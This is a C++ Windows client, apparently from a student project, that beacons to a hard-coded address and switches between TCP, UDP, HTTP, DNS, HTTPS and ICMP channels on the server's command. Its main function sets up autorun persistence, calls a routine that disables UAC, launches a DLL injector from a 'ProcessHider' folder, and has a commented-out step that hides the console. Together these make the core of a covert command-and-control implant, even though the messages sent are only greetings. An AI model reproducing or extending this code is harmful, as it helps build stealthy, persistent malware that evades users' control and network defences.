#include "main.h"
struct addrinfo *result = NULL,
	*ptr = NULL,
	hints;

int TCP1(int ConnectSocket) {
	int iResult;
	char sendbuf[] = "Hello! I am TCP client!";
	while (true)
	{
		char recvbuf[DEFAULT_BUFLEN] = { 0 };
		// Send an initial buffer
		iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult > 0)
		{
			printf("%s \n", recvbuf);
			if (recvbuf[strlen(recvbuf) - 1] == '*') {
				printf("Change protocol ..........\n");
				return 1;
			}
			//printf("%s\n", recvbuf);
			int sendLen = strlen(sendbuf);
			iResult = send(ConnectSocket, sendbuf, strlen(sendbuf), 0);
			if (iResult > 0) {
				//printf("%s\n", sendbuf);
				if (sendbuf[sendLen - 1] == '*') {
					return 1;
				}
			}
			else
			{
				printf("TCP: send failed with error: %d\n", WSAGetLastError());
				exit(EXIT_FAILURE);
			}
		}
		else
		{
			printf("TCP: recv failed with error: %d\n", WSAGetLastError());
			exit(EXIT_FAILURE);
		}
	}

}

int Protocol(char *ip) {
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData; ///The WSADATA structure contains information about the Windows Sockets implementation.

	//initialise winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC; // address family is unspecificed
	hints.ai_socktype = SOCK_STREAM; // stream
	hints.ai_protocol = IPPROTO_TCP; // protocal TCP

	// Resolve the server address and port
	iResult = getaddrinfo(ip, DEFAULT_PORT, &hints, &result); // provides protocol-independent translation from an ANSI host name to an address.
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}
		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}
	while (true)
	{
		char recvbuf[DEFAULT_BUFLEN] = { 0 };
		// Send an initial buffer
		iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult > 0)
		{
			printf("%s\n", recvbuf);
			if (recvbuf[0] == '1') {
				printf("\nProtocol TCP \n");
				iResult = send(ConnectSocket, "1", 1, 0);
				if (iResult <= 0) {
					printf("Error %d", iResult);
				}
				TCP1(ConnectSocket);
				//closesocket(ConnectSocket);
				//WSACleanup();
				//return 1;
			}
			else if (recvbuf[0] == '2') {
				printf("\nProtocol UDP \n");
				iResult = send(ConnectSocket, "1", 1, 0);
				if (iResult <= 0) {
					printf("Error %d", iResult);
				}
				closesocket(ConnectSocket);
				WSACleanup();
				return 2;
			}
			else if (recvbuf[0] == '3')
			{
				printf("\nProtocol HTTP \n");
				iResult = send(ConnectSocket, "1", 1, 0);
				return 3;
			}
			else if (recvbuf[0] == '4') {
				printf("\nProtocol DNS \n");
				iResult = send(ConnectSocket, "1", 1, 0);
				return 4;
			}
			else if (recvbuf[0] == '5') {
				printf("\nProtocol HTTPS \n");
				iResult = send(ConnectSocket, "1", 1, 0);
				return 5;
			}
			else if (recvbuf[0] == '6') {
				printf("\nProtocol ICMP \n");
				iResult = send(ConnectSocket, "1", 1, 0);
				return 6;
			}
			else if (recvbuf[strlen(recvbuf) - 1] == '*') {
				printf("Change protocol ..........\n");
				return 10;
			}
			else {
				printf("Protocol is not exist! \n");
				iResult = send(ConnectSocket, "0", 1, 0);
				//return 9;
			}
		}
		else
		{
			printf("recv failed with error: %d\n", WSAGetLastError());
			exit(EXIT_FAILURE);
		}
	}
}
int TCP(char *ip) {
	Sleep(1000);
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	char sendbuf[] = "Hello! I am TCP client!";
	WSADATA wsaData; ///The WSADATA structure contains information about the Windows Sockets implementation.
	//SOCKET ConnectSocket = INVALID_SOCKET;
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC; // address family is unspecificed
	hints.ai_socktype = SOCK_STREAM; // stream
	hints.ai_protocol = IPPROTO_TCP; // protocal TCP

	// Resolve the server address and port
	iResult = getaddrinfo(ip, DEFAULT_PORT, &hints, &result); // provides protocol-independent translation from an ANSI host name to an address.
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}
		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server11!\n");
		WSACleanup();
		return 1;
	}
	while (true)
	{
		char recvbuf[DEFAULT_BUFLEN] = { 0 };
		// Send an initial buffer
		iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult > 0)
		{
			printf("%s\n", recvbuf);
			int sendLen = strlen(sendbuf);
			iResult = send(ConnectSocket, sendbuf, strlen(sendbuf), 0);
			if (iResult > 0) {
				//printf("%s\n", sendbuf);
				if (sendbuf[sendLen - 1] == '*') {
					return 1;
				}
			}
			else
			{
				printf("TCP: send failed with error: %d\n", WSAGetLastError());
				exit(EXIT_FAILURE);
			}
		}
		else
		{
			printf("TCP: recv failed with error: %d\n", WSAGetLastError());
			exit(EXIT_FAILURE);
		}
	}
}

int UDP(char *ip) {
	struct sockaddr_in other;
	int s, slen = sizeof(other);
	char recvbuf[DEFAULT_BUFLEN];
	char message[DEFAULT_BUFLEN];

	WSADATA wsaData; ///The WSADATA structure contains information about the Windows Sockets implementation.
	//SOCKET ConnectSocket = INVALID_SOCKET;
	int iResult;
	//initialise winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}


	//create socket
	if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR)
	{
		printf(" socket() failed with error code : %d", WSAGetLastError());
		exit(EXIT_FAILURE);
	}

	//set up address structure
	memset((char *)&other, 0, sizeof(other));
	other.sin_family = AF_INET; // address family is unspecificed
	other.sin_port = htons(PORT); // stream
	other.sin_addr.S_un.S_addr = inet_addr(ip); // 

	while (1) {
		Sleep(1000);
		char message[] = "Hello from Client UDP";


		if (sendto(s, message, strlen(message), 0, (struct sockaddr*) &other, slen) == SOCKET_ERROR) {
			printf("Socket() error: %d", WSAGetLastError());
			exit(EXIT_FAILURE);
		}

		memset(recvbuf, '\0', DEFAULT_BUFLEN);
		if (recvfrom(s, recvbuf, DEFAULT_BUFLEN, 0, (struct sockaddr*) &other, &slen) == SOCKET_ERROR) {
			printf("recvfrom() error: %d", WSAGetLastError());
			//exit(EXIT_FAILURE);
		}

		printf("%s \n", recvbuf);
		if (recvbuf[strlen(recvbuf) - 1] == '*') {
			break;
		}
	}
}

int DNS(char *ip) {
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	///char sendbuf[] = "This is message from client  ";
	char recvbuf[DEFAULT_BUFLEN] = { 0 };
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;
	char buffer[10000];
	int nDataLength;
	string website_HTML;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, DNS_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	while (1) {
		string dns = "google.com DNS from client";
		int send1 = send(ConnectSocket, dns.c_str(), strlen(dns.c_str()), 0);
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		char subStr[50] = { 0 };
		for (int i = 0; i < iResult; i++) {
			subStr[i] = recvbuf[i];
		}
		printf("%s\n", subStr);
		if (subStr[strlen(subStr) - 1] == '*') {
			return 1;
		}
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();
	return 0;
}

int HTTP(char *ip) {
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	char sendbuf[] = "This is message from client  ";
	char recvbuf[DEFAULT_BUFLEN] = { 0 };
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;
	char buffer[3000];
	int nDataLength;
	string website_HTML;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, HTTP_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	while (1) {
		memset(buffer, '\0', 3000);
		string get_http = "GET /index.html?\r\nMessage=Hello from client HTTP/1.1\r\n\r\n";
		send(ConnectSocket, get_http.c_str(), strlen(get_http.c_str()), 0);
		nDataLength = recv(ConnectSocket, buffer, 3000, 0);
		if (nDataLength > 0) {
			int i = 0;
			while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {

				website_HTML += buffer[i];
				i += 1;
			}
			cout << website_HTML << endl;

			if (website_HTML[website_HTML.length() - 1] == '*') {
				closesocket(ConnectSocket);
				WSACleanup();
				return 1;
			}
			website_HTML = "";
		}

	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();
	return 0;
}

int Ping(char *ip) {
	SOCKET rawSocket;
	WSADATA wsaData;
	WORD   wVersionRequested = MAKEWORD(2, 0);
	//init Winsock session will be called only once..
	int startup = WSAStartup(wVersionRequested, &wsaData);
	if (startup)
	{
		printf("Errot initializing winsock\n");
		return 0;
	}
	//Here it is checking for version requested...
	if (wsaData.wVersion != wVersionRequested)
	{
		printf("Error winsock version not supported\n");
		return 0;
	}
	rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if (rawSocket == NULL)
	{
		printf("Socket creation failre..\n");
		return 0;
	}
	if (rawSocket < 0) {
		perror("Error!");
		return 0;
	}

	//Here preparation is done to bind the socket.
	objServAddress.sin_addr.s_addr = htonl(INADDR_ANY);
	objServAddress.sin_family = AF_INET;
	//objServAddress.sin_port = htons(3478);
	//Here it binds the socket...
	int nRetValue = bind(rawSocket, (struct sockaddr*)&objServAddress, sizeof(objServAddress));
	if (nRetValue == SOCKET_ERROR)
	{
		printf("Socket binding is failed\n");
		closesocket(rawSocket);
		rawSocket = NULL;
		return 0;
	}

	int nRet;
	int bg = 123;
	char sendBuffer[sizeof(struct tagICMPHDR) + 32] = { 0 };
	_ICMP = new ICMP();
	_ICMP->type = 0;
	_ICMP->code = 0;
	_ICMP->cksum = 0;
	_ICMP->id = bg++;
	_ICMP->seq++;
	while (1) {
		ECHOREPLY echoReply;

		struct sockaddr_in from;
		int nAddrLen = sizeof(from);

		nRet = recvfrom(rawSocket, (LPSTR)&echoReply, sizeof(ECHOREPLY), 0, (struct sockaddr *)&from, &nAddrLen);
		if (nRet == SOCKET_ERROR)
		{
			int nError = WSAGetLastError();
			printf("Error:%d\n", nError);
			return false;
		}

		printf("Nhan duoc tu server: "); cout << echoReply.icmpHdr.Data << endl;
		//int dataLen = strlen(echoReply.icmpHdr.Data);
		if (echoReply.icmpHdr.Data[0] == '*')
		{
			closesocket(rawSocket);
			WSACleanup();
			printf("end icmp!\n");
			return 1;
		}
		//Here it constructs the echo reply and sends the same back to the client
		//ECHOREQUEST echoReq;
		//_ICMP = new ICMP();

		//Fill in echo reply..



		memcpy(sendBuffer, _ICMP, sizeof(struct ICMP));
		char msg[] = "I am ICMP!";
		//cout << _ICMP << endl;
		//cout << &sendBuffer << endl;
		//msg[strlen(msg)] = '\0';
		int length = strlen(msg);

		memcpy(sendBuffer + sizeof(struct ICMP), msg, length);
		_ICMP->cksum = in_cksum((USHORT *)sendBuffer, sizeof sendBuffer);
		//u_short x = in_cksum((USHORT *)sendBuffer, sizeof sendBuffer);
		//printf("%d",x);
		//_ICMP->cksum = x;
		memcpy(sendBuffer, _ICMP, sizeof(struct ICMP));
		//save tick count when sent..
		//echoReq.dwTime = GetTickCount();
		//Put data in packet and compute checksum
		Sleep(1000);
		objClientAddress.sin_addr.s_addr = inet_addr(ip);
		objClientAddress.sin_family = AF_INET;
		nRet = sendto(rawSocket, sendBuffer, sizeof(sendBuffer), 0, (struct sockaddr *)&objClientAddress, nAddrLen);
		if (nRet == SOCKET_ERROR)
		{
			int nError = WSAGetLastError();
			printf("Failure while sending and receiving data, Error:%d\n", nError);
			return 0;
		}
	}
	return 1;
}

int HTTPS(char *ip) {
	int flag = 0;
	while (1) {
		WSADATA d;
		if (WSAStartup(MAKEWORD(2, 2), &d)) {
			fprintf(stderr, "Failed to initialize.\n");
			return 1;
		}
		SSL_library_init();
		OpenSSL_add_all_algorithms();
		SSL_load_error_strings();

		SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
		if (!ctx) {
			fprintf(stderr, "SSL_CTX_new() failed.\n");
			return 1;
		}

		//printf("Configuring remote address...\n");
		struct addrinfo hints;
		memset(&hints, 0, sizeof(hints));
		hints.ai_socktype = SOCK_STREAM;
		struct addrinfo *peer_address;
		if (getaddrinfo(ip, HTTPS_PORT, &hints, &peer_address)) {
			fprintf(stderr, "getaddrinfo() failed. (%d)\n", GETSOCKETERRNO());
			exit(1);
		}

		//printf("Remote address is: ");
		char address_buffer[100];
		char service_buffer[100];
		getnameinfo(peer_address->ai_addr, peer_address->ai_addrlen,
			address_buffer, sizeof(address_buffer),
			service_buffer, sizeof(service_buffer),
			NI_NUMERICHOST);
		//printf("%s %s\n", address_buffer, service_buffer);

		//printf("Creating socket...\n");
		SOCKET server;
		server = socket(peer_address->ai_family,
			peer_address->ai_socktype, peer_address->ai_protocol);
		if (!ISVALIDSOCKET(server)) {
			fprintf(stderr, "socket() failed. (%d)\n", GETSOCKETERRNO());
			exit(1);
		}

		//printf("Connecting...\n");
		if (connect(server,
			peer_address->ai_addr, peer_address->ai_addrlen)) {
			fprintf(stderr, "connect() failed. (%d)\n", GETSOCKETERRNO());
			exit(1);
		}
		freeaddrinfo(peer_address);

		//printf("Connected.\n\n");


		SSL *ssl = SSL_new(ctx);
		if (!ctx) {
			fprintf(stderr, "SSL_new() failed.\n");
			return 1;
		}

		if (!SSL_set_tlsext_host_name(ssl, ip)) {
			fprintf(stderr, "SSL_set_tlsext_host_name() failed.\n");
			ERR_print_errors_fp(stderr);
			return 1;
		}

		SSL_set_fd(ssl, server);
		if (SSL_connect(ssl) == -1) {
			fprintf(stderr, "SSL_connect() failed.\n");
			ERR_print_errors_fp(stderr);
			return 1;
		}

		//printf("SSL/TLS using %s\n", SSL_get_cipher(ssl));


		X509 *cert = SSL_get_peer_certificate(ssl);
		if (!cert) {
			fprintf(stderr, "SSL_get_peer_certificate() failed.\n");
			return 1;
		}

		char *tmp;
		if ((tmp = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0))) {
			//printf("subject: %s\n", tmp);
			OPENSSL_free(tmp);
		}

		if ((tmp = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0))) {
			//printf("issuer: %s\n", tmp);
			OPENSSL_free(tmp);
		}

		X509_free(cert);


		char buffer[2048];
		char messeage[] = "Hello server";
		sprintf(buffer, "GET / HTTP/1.1\r\n");
		sprintf(buffer + strlen(buffer), "Host: %s:%s\r\n", ip, HTTPS_PORT);
		sprintf(buffer + strlen(buffer), "%s\r\n", messeage);
		sprintf(buffer + strlen(buffer), "Connection: close\r\n");
		sprintf(buffer + strlen(buffer), "User-Agent: https_simple\r\n");
		sprintf(buffer + strlen(buffer), "\r\n");

		SSL_write(ssl, buffer, strlen(buffer));
		int dem = 0;
		memset(buffer, 0, sizeof(buffer));
		while (1) {
			int bytes_received = SSL_read(ssl, buffer, sizeof(buffer));
			if (bytes_received < 1) {
				//printf("\nConnection closed by peer.\n");
				break;
			}

			if (dem++ == 1) {
				char* receive = strtok(buffer, "\r\n");
				if (receive[0] == '*') flag = 1;
				printf("Received from server (%d bytes): %s\n", bytes_received, receive);
				break;
			}

		}
		Sleep(1000);
		SSL_shutdown(ssl);
		CLOSESOCKET(server);
		SSL_free(ssl);
		SSL_CTX_free(ctx);

		WSACleanup();
		//		printf("Finished.\n");
		if (flag == 1) return 0;
	}
	return 0;
}
int main()
{
	AutoRunStartUp();
	CloseUAC();
	stringstream ss;
	string path = "D:\\Nam 5\\t6\\ProcessHider-master\\ProcessHider-master\\x64\\Release\\DLL_Injector.exe";

	ss << "\"";                             // command opening quote
	ss << "\"" << path << "\" "; // Quoted binary (could have spaces)
	ss << "\"";                             // command closing quote
	startup(ss.str().c_str());
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	char ip[] = "192.168.8.102";

	while (1) {
		int protocol = Protocol(ip);
		if (protocol == 2) {
			//Sleep(1000);
			UDP(ip);
		}
		else if (protocol == 1)
		{
			TCP(ip);
		}
		else if (protocol == 3)
		{
			HTTP(ip);
		}
		else if (protocol == 4)
		{
			DNS(ip);
		}
		else if (protocol == 5) {
			HTTPS(ip);
		}
		else {
			Ping(ip);
		}
	}


	system("pause");

	return 0;
}
